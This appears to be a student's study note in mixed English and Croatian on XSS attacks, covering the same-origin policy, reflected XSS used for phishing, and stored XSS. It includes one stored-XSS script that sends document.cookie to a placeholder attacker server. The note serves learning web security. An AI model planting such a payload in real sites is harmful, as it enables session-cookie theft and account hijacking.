---
alias: ""
theme: ""
edited: 2022-06-26
---
# XSS attacks
- code that runs on the user side

## Same origin policy
- skripte koje su na jednoj stranici smiju medjusobno dijeliti podatke ali ne mogu sa stranicama izvana

## Reflected
- users need to click on them
- used for phishing attacks
	- setup a website that stores user login details

## Stored
- runs every time a unique users refreshes the site
- can send cookies without the users knowledge
```html
//Ili na vlastiti stroj?
<script>document.location.href='http://<IP-ADRESA-HTTPSERV:PORT/cookie=?'+document.cookie</script>
```

---
# References
- [SRS sigurnost web aplikacija predavanje](https://youtu.be/2kwz7xZi_tU?t=4569)
- [[10-Sigurnost-web-aplikacija.pdf]]
- 